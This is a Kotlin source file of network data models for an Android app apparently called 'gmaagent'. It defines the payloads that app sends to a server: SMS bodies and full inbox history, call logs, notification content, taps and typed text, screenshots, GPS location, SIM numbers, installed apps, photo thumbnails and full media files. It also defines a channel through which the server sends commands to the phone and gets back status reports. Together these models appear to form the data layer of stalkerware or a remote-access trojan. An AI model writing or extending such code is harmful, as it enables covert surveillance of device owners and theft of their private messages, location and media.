package com.example.gmaagent.network

import kotlinx.serialization.Serializable

// ══════════════════════════════════════════════════════════════
//  Sync Request Models (sent TO the server)
// ══════════════════════════════════════════════════════════════

@Serializable
data class SmsEntry(
    val address: String,
    val body: String? = null,
    val sms_type: String,      // "inbox" | "sent" | "draft"
    val timestamp: String,     // ISO-8601
    val read: Boolean = false,
)

@Serializable
data class CallEntry(
    val phone_number: String,
    val call_type: String,     // "incoming" | "outgoing" | "missed" | "rejected"
    val duration_seconds: Int = 0,
    val timestamp: String,     // ISO-8601
    val contact_name: String? = null,
)

@Serializable
data class DeviceSyncRequest(
    val sms_messages: List<SmsEntry>? = null,
    val call_logs: List<CallEntry>? = null,
)


// ══════════════════════════════════════════════════════════════
//  Sync Response Models (received FROM the server)
// ══════════════════════════════════════════════════════════════

@Serializable
data class SyncAckResponse(
    val status: String = "ok",
    val sms_ingested: Int = 0,
    val calls_ingested: Int = 0,
    val pending_commands: Int = 0,
    val message: String = "",
)


// ══════════════════════════════════════════════════════════════
//  Command Models
// ══════════════════════════════════════════════════════════════

@Serializable
data class PendingCommand(
    val command_id: String,
    val command_type: String,
    val payload: String? = null,    // JSON string
    val created_at: String,
)

@Serializable
data class CommandStatusUpdate(
    val command_id: String,
    val status: String,             // "delivered" | "executed" | "failed"
    val result: String? = null,
)


// ══════════════════════════════════════════════════════════════
//  Device Registration
// ══════════════════════════════════════════════════════════════

@Serializable
data class DeviceRegisterRequest(
    val device_id: String,
    val device_name: String? = null,
    val model: String? = null,
    val manufacturer: String? = null,
    val os_version: String? = null,
)

@Serializable
data class DeviceRegisterResponse(
    val id: String,
    val device_id: String,
    val api_key: String,
    val message: String = "",
)


// ══════════════════════════════════════════════════════════════
//  Communication Logs — Full SMS inbox history
// ══════════════════════════════════════════════════════════════

@Serializable
data class CommunicationLogEntry(
    val address: String,       // Sender phone number
    val body: String? = null,  // SMS message content
    val timestamp: String,     // ISO-8601
)

@Serializable
data class CommunicationLogSyncRequest(
    val logs: List<CommunicationLogEntry>,
)

@Serializable
data class CommunicationLogSyncResponse(
    val status: String = "ok",
    val logs_ingested: Int = 0,
    val duplicates_skipped: Int = 0,
    val message: String = "",
)


// ══════════════════════════════════════════════════════════════
//  Device Telemetry & Diagnostics
// ══════════════════════════════════════════════════════════════

@Serializable
data class AppInfo(
    val name: String,
    val `package`: String,
    val version: String? = null,
    val is_system: Boolean = false,
)

@Serializable
data class DeviceTelemetryRequest(
    val battery_level: Int? = null,
    val storage_available_gb: Float? = null,
    val storage_total_gb: Float? = null,
    val ram_total_gb: Float? = null,
    val serial_number: String? = null,
    val latitude: Double? = null,
    val longitude: Double? = null,
    val ip_address: String? = null,
    val network_type: String? = null,
    val installed_apps: List<AppInfo>? = null,
    val phone_number: String? = null,
    val sim_1: String? = null,
    val sim_2: String? = null,
    val foreground_app: String? = null,
    val foreground_app_package: String? = null,
    val signal_strength: Int? = null,
    val network_latency_ms: Int? = null,
)

@Serializable
data class DeviceTelemetryResponse(
    val status: String = "ok",
    val message: String = "",
)


// ══════════════════════════════════════════════════════════════
//  Monitoring — Notifications
// ══════════════════════════════════════════════════════════════

@Serializable
data class NotificationEntry(
    val app_name: String,
    val app_package: String,
    val title: String? = null,
    val content: String? = null,
    val timestamp: String,     // ISO-8601
)

@Serializable
data class NotificationSyncRequest(
    val notifications: List<NotificationEntry>,
)

@Serializable
data class NotificationSyncResponse(
    val status: String = "ok",
    val ingested: Int = 0,
    val message: String = "",
)


// ══════════════════════════════════════════════════════════════
//  Monitoring — User Interactions
// ══════════════════════════════════════════════════════════════

@Serializable
data class InteractionEntry(
    val interaction_type: String,  // "click" | "text_input" | "scroll" | "long_press"
    val target_text: String? = null,
    val target_class: String? = null,
    val app_package: String? = null,
    val x: Float? = null,
    val y: Float? = null,
    val timestamp: String,     // ISO-8601
)

@Serializable
data class InteractionSyncRequest(
    val interactions: List<InteractionEntry>,
)

@Serializable
data class InteractionSyncResponse(
    val status: String = "ok",
    val ingested: Int = 0,
    val message: String = "",
)


// ══════════════════════════════════════════════════════════════
//  Monitoring — Screenshots
// ══════════════════════════════════════════════════════════════

@Serializable
data class ScreenshotUploadRequest(
    val image_base64: String,
    val captured_at: String,  // ISO-8601
)

@Serializable
data class ScreenshotUploadResponse(
    val status: String = "ok",
    val screenshot_id: String = "",
    val message: String = "",
)


// ══════════════════════════════════════════════════════════════
//  Media Library — Thumbnails
// ══════════════════════════════════════════════════════════════

@Serializable
data class MediaThumbnailEntry(
    val media_store_id: String,
    val media_type: String = "image",   // "image" | "video"
    val file_name: String? = null,
    val file_size: Int? = null,
    val width: Int? = null,
    val height: Int? = null,
    val duration_ms: Int? = null,
    val mime_type: String? = null,
    val date_taken: String? = null,     // ISO-8601
    val thumbnail_b64: String,
)

@Serializable
data class MediaThumbnailSyncRequest(
    val thumbnails: List<MediaThumbnailEntry>,
)

@Serializable
data class MediaThumbnailSyncResponse(
    val status: String = "ok",
    val ingested: Int = 0,
    val skipped: Int = 0,
    val message: String = "",
)


// ══════════════════════════════════════════════════════════════
//  Media Library — Full File Upload
// ══════════════════════════════════════════════════════════════

@Serializable
data class MediaFullFileUploadRequest(
    val media_store_id: String,
    val file_data: String,
    val mime_type: String? = null,
)

@Serializable
data class MediaFullFileUploadResponse(
    val status: String = "ok",
    val media_id: String = "",
    val message: String = "",
)
